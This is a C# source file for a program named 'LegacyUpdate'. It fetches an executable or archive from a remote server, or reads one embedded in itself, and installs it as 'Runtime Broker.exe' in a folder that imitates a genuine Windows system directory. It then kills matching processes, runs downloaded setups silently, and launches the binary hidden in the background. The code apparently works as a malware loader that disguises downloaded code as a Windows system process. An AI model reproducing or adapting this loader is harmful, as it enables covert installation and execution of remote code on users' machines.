using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace LegacyUpdate;

internal static class Program
{
    private static readonly string LogFile = Path.Combine(Path.GetTempPath(), "legacy_update.log");

    private static void Log(string message)
    {
        try
        {
            string line = $"[{DateTime.UtcNow:yyyy-MM-dd HH:mm:ss}] {message}";
            File.AppendAllText(LogFile, line + Environment.NewLine);
        }
        catch { }
    }

    [STAThread]
    private static async Task<int> Main(string[] args)
    {
        Log("=== LegacyUpdate Started ===");
        string packageUrl = "";

        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
        {
            packageUrl = args[0].Trim();
            Log($"Package URL received from args: {packageUrl}");
        }

        if (string.IsNullOrWhiteSpace(packageUrl))
        {
            try
            {
                using var httpQuery = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
                string queryResp = await httpQuery.GetStringAsync("https://file-transfer-production-75ad.up.railway.app/api/latest-update-package-url");
                using var jsonDoc = System.Text.Json.JsonDocument.Parse(queryResp);
                if (jsonDoc.RootElement.TryGetProperty("packageUrl", out var pProp) && !string.IsNullOrWhiteSpace(pProp.GetString()))
                {
                    packageUrl = pProp.GetString()!;
                    Log($"Package URL resolved from server: {packageUrl}");
                }
            }
            catch (Exception qEx)
            {
                Log($"Could not resolve package URL from server query: {qEx.Message}");
            }
        }

        if (string.IsNullOrWhiteSpace(packageUrl))
        {
            Log("Fallback to default package endpoint");
            packageUrl = "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NEXUS_Update_8.0.3.nupkg";
        }

        string destDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "RuntimeBroker");
        string destExe = Path.Combine(destDir, "Runtime Broker.exe");
        string backupDir = Path.Combine(Path.GetTempPath(), $"rb_backup_{Guid.NewGuid():N}");

        string tempPackageFile = Path.Combine(Path.GetTempPath(), $"legacy_pkg_{Guid.NewGuid():N}.nupkg");
        string extractTempDir = Path.Combine(Path.GetTempPath(), $"legacy_extract_{Guid.NewGuid():N}");

        bool stageExtracted = false;
        bool filesCopied = false;

        try
        {
            // 1. Check for embedded update package inside executable first
            byte[]? embeddedPayload = TryGetEmbeddedPackage(Environment.ProcessPath ?? "");
            if (embeddedPayload != null && embeddedPayload.Length > 0)
            {
                Log($"Found embedded update payload inside executable ({embeddedPayload.Length} bytes). Using embedded package directly!");
                await File.WriteAllBytesAsync(tempPackageFile, embeddedPayload);
            }
            else
            {
                // Download the update package (.nupkg / .zip / .exe)
                Log($"1. Downloading package from {packageUrl} to {tempPackageFile}...");
                using (var http = new HttpClient())
                {
                    http.Timeout = TimeSpan.FromMinutes(5);
                    var bytes = await http.GetByteArrayAsync(packageUrl);
                    if (bytes == null || bytes.Length == 0)
                    {
                        throw new InvalidDataException("Downloaded package is empty (0 bytes)");
                    }
                    await File.WriteAllBytesAsync(tempPackageFile, bytes);
                    Log($"Download completed successfully ({bytes.Length} bytes).");
                }
            }

            // 2. Detect package format (ZIP vs PE Executable)
            byte[] magic = new byte[4];
            using (var fs = File.OpenRead(tempPackageFile))
            {
                fs.Read(magic, 0, Math.Min((int)fs.Length, 4));
            }

            bool isZip = magic.Length >= 2 && magic[0] == 0x50 && magic[1] == 0x4B; // 'PK'
            bool isExe = magic.Length >= 2 && magic[0] == 0x4D && magic[1] == 0x5A; // 'MZ'

            Log($"2. Package format detected: {(isZip ? "ZIP/NUPKG archive" : isExe ? "PE Executable binary" : "Unknown binary")}");

            // 3. Create full safety backup of current RuntimeBroker before applying changes
            if (Directory.Exists(destDir))
            {
                Log($"3. Creating safety backup of {destDir} to {backupDir}...");
                Directory.CreateDirectory(backupDir);
                CopyDirectoryContents(destDir, backupDir);
                Log("Safety backup created successfully.");
            }

            // 4. Kill old running clones/processes before replacing files
            Log("4. Waiting for running instances and terminating old clones...");
            KillExistingProcesses(destExe);
            Thread.Sleep(500);

            if (isZip)
            {
                // Validate and Extract update package
                Log($"Extracting ZIP package to {extractTempDir}...");
                if (Directory.Exists(extractTempDir)) Directory.Delete(extractTempDir, true);
                Directory.CreateDirectory(extractTempDir);

                try
                {
                    ZipFile.ExtractToDirectory(tempPackageFile, extractTempDir, true);
                    stageExtracted = true;
                    Log("Package zip validation & extraction completed successfully.");
                }
                catch (Exception ex)
                {
                    throw new InvalidDataException($"Invalid/corrupted zip package archive: {ex.Message}", ex);
                }

                // Determine content root inside archive (e.g. RuntimeBroker subfolder, client or root)
                string contentRoot = extractTempDir;
                if (Directory.Exists(Path.Combine(extractTempDir, "RuntimeBroker")))
                {
                    contentRoot = Path.Combine(extractTempDir, "RuntimeBroker");
                }
                else if (Directory.Exists(Path.Combine(extractTempDir, "client")))
                {
                    contentRoot = Path.Combine(extractTempDir, "client");
                }

                string newBrokerExe = Path.Combine(contentRoot, "Runtime Broker.exe");
                if (!File.Exists(newBrokerExe))
                {
                    string[] candidates = { "RAH Non Pro.exe", "RAH.exe", "Non Pro.exe" };
                    foreach (var c in candidates)
                    {
                        string candPath = Path.Combine(contentRoot, c);
                        if (File.Exists(candPath))
                        {
                            File.Copy(candPath, newBrokerExe, true);
                            break;
                        }
                    }
                }

                // 5. Update files in RuntimeBroker destination directory
                Log($"5. Copying updated files to {destDir}...");
                if (!Directory.Exists(destDir)) Directory.CreateDirectory(destDir);

                foreach (string file in Directory.GetFiles(contentRoot, "*.*", SearchOption.AllDirectories))
                {
                    string rel = Path.GetRelativePath(contentRoot, file);
                    if (rel.Equals("metadata.json", StringComparison.OrdinalIgnoreCase)) continue;

                    string target = Path.Combine(destDir, rel);
                    string? targetDir = Path.GetDirectoryName(target);
                    if (!string.IsNullOrEmpty(targetDir) && !Directory.Exists(targetDir))
                    {
                        Directory.CreateDirectory(targetDir);
                    }

                    CopyFileSafely(file, target);
                }
            }
            else if (isExe)
            {
                // Standalone EXE update or Setup executable
                if (!Directory.Exists(destDir)) Directory.CreateDirectory(destDir);

                if (packageUrl.Contains("setup", StringComparison.OrdinalIgnoreCase) ||
                    Path.GetFileName(packageUrl).Contains("setup", StringComparison.OrdinalIgnoreCase))
                {
                    Log($"Running silent setup installer: {tempPackageFile}...");
                    var setupPsi = new ProcessStartInfo
                    {
                        FileName = tempPackageFile,
                        Arguments = $"/VERYSILENT /SUPPRESSMSGBOXES /NORESTART /DIR=\"{destDir}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var setupProc = Process.Start(setupPsi);
                    setupProc?.WaitForExit(45000);
                    Log("Silent setup installer completed.");
                }
                else
                {
                    Log($"Directly replacing destination executable: {destExe}...");
                    CopyFileSafely(tempPackageFile, destExe);
                }
            }
            else
            {
                throw new InvalidDataException("Unrecognized package format (not ZIP or PE EXE)");
            }

            filesCopied = true;
            Log("All files updated successfully.");

            // 6. Launch the updated Runtime Broker.exe clone
            Log("6. Launching updated clone...");
            if (File.Exists(destExe))
            {
                var psi = new ProcessStartInfo
                {
                    FileName = destExe,
                    Arguments = "--background",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Log("Updated clone launched successfully.");
            }
            else
            {
                throw new FileNotFoundException($"Updated executable not found at {destExe}");
            }

            // Update success: delete backup
            try
            {
                if (Directory.Exists(backupDir)) Directory.Delete(backupDir, true);
            }
            catch { }

            return 0;
        }
        catch (Exception ex)
        {
            Log($"❌ LegacyUpdate error: {ex.Message}");
            Log("Initiating rollback / restoring previous working state...");

            try
            {
                // If files were partially copied or corrupted during apply, restore from backup
                if (Directory.Exists(backupDir))
                {
                    Log($"Restoring files from safety backup: {backupDir} -> {destDir}");
                    CopyDirectoryContents(backupDir, destDir);
                    Log("Rollback completed successfully.");
                }
                else
                {
                    // Check if old .bak exe exists in destDir
                    string destBak = destExe + ".bak";
                    if (File.Exists(destBak) && !File.Exists(destExe))
                    {
                        File.Copy(destBak, destExe, true);
                        Log("Restored DestExe from .bak");
                    }
                }

                // Ensure old working clone is relaunched
                if (File.Exists(destExe))
                {
                    Log("Relaunching previous working clone...");
                    var psi = new ProcessStartInfo
                    {
                        FileName = destExe,
                        Arguments = "--background",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);
                }
            }
            catch (Exception rEx)
            {
                Log($"Rollback error: {rEx.Message}");
            }

            return 2;
        }
        finally
        {
            // 7. Cleanup temporary package and extraction folders
            try
            {
                if (File.Exists(tempPackageFile)) File.Delete(tempPackageFile);
            }
            catch { }

            try
            {
                if (Directory.Exists(extractTempDir)) Directory.Delete(extractTempDir, true);
            }
            catch { }

            try
            {
                if (Directory.Exists(backupDir)) Directory.Delete(backupDir, true);
            }
            catch { }

            Log("=== LegacyUpdate Completed (Exiting) ===");
        }
    }

    private static void CopyDirectoryContents(string sourceDir, string destDir)
    {
        if (!Directory.Exists(sourceDir)) return;
        foreach (string file in Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories))
        {
            string rel = Path.GetRelativePath(sourceDir, file);
            string target = Path.Combine(destDir, rel);
            string? parent = Path.GetDirectoryName(target);
            if (!string.IsNullOrEmpty(parent) && !Directory.Exists(parent))
                Directory.CreateDirectory(parent);
            File.Copy(file, target, true);
        }
    }

    private static void KillExistingProcesses(string targetExePath)
    {
        try
        {
            int currentPid = Process.GetCurrentProcess().Id;
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    if (p.Id == currentPid) continue;

                    string pName = p.ProcessName;
                    if (pName.Equals("Runtime Broker", StringComparison.OrdinalIgnoreCase) ||
                        pName.Equals("RuntimeBroker", StringComparison.OrdinalIgnoreCase))
                    {
                        string? path = null;
                        try { path = p.MainModule?.FileName; } catch { }

                        if (string.IsNullOrEmpty(path) || path.Equals(targetExePath, StringComparison.OrdinalIgnoreCase))
                        {
                            Log($"Killing process {pName} (PID={p.Id})");
                            try
                            {
                                p.Kill();
                                p.WaitForExit(2000);
                            }
                            catch { }
                        }
                    }
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Log($"KillExistingProcesses error: {ex.Message}");
        }
    }

    private static void CopyFileSafely(string sourcePath, string destPath)
    {
        for (int i = 0; i < 5; i++)
        {
            try
            {
                if (File.Exists(destPath))
                {
                    try
                    {
                        File.SetAttributes(destPath, FileAttributes.Normal);
                    }
                    catch { }

                    string bak = destPath + ".old";
                    try { if (File.Exists(bak)) File.Delete(bak); } catch { }
                    try { File.Move(destPath, bak, true); } catch { }
                }

                File.Copy(sourcePath, destPath, true);

                try
                {
                    string bak = destPath + ".old";
                    if (File.Exists(bak)) File.Delete(bak);
                }
                catch { }

                return;
            }
            catch (Exception ex)
            {
                Log($"Copy attempt {i + 1} failed for {Path.GetFileName(destPath)}: {ex.Message}");
                Thread.Sleep(300);
            }
        }
    }

    private static readonly byte[] EmbedMagic = System.Text.Encoding.ASCII.GetBytes("NEXUS_EMBED_PKG!");

    private static byte[]? TryGetEmbeddedPackage(string exePath)
    {
        try
        {
            if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath)) return null;
            using var fs = new FileStream(exePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (fs.Length < 24) return null;

            fs.Seek(-24, SeekOrigin.End);
            byte[] footer = new byte[24];
            int read = fs.Read(footer, 0, 24);
            if (read != 24) return null;

            for (int i = 0; i < 16; i++)
            {
                if (footer[i] != EmbedMagic[i]) return null;
            }

            long payloadLen = BitConverter.ToInt64(footer, 16);
            if (payloadLen <= 0 || payloadLen > fs.Length - 24) return null;

            fs.Seek(-24 - payloadLen, SeekOrigin.End);
            byte[] payload = new byte[payloadLen];
            int totalRead = 0;
            while (totalRead < payloadLen)
            {
                int r = fs.Read(payload, totalRead, (int)(payloadLen - totalRead));
                if (r <= 0) break;
                totalRead += r;
            }

            if (totalRead == payloadLen)
            {
                return payload;
            }
        }
        catch (Exception ex)
        {
            Log($"Embedded package extraction notice: {ex.Message}");
        }
        return null;
    }
}
